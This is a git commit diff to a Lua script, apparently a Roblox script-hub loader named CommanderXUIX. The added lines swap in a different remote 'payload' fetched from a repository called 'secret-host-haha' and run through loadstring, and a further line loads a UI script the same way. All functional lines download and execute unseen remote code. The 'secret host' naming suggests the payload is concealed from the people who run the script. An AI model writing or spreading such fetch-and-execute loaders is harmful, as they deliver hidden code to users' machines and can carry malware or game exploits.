74e099fb359e823c08b810e247ba86f9f8118979
anyahubs <131607266+anyahubs@users.noreply.github.com>
2024-01-25 13:57:02 +0300

    Update CommanderXUIX.lua

--- CommanderXUIX.lua
+++ CommanderXUIX.lua
@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/anyahubs/executer/main/payload.lua"))();
-wait(5)
-print("payload loaded")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/delta-hydro/secret-host-haha/main/drawing_script.lua"))();
+wait(1)
+print("payload loaded I V2")
 loadstring(game:HttpGet('https://raw.githubusercontent.com/anyahubs/CommanderX/main/UI'))()
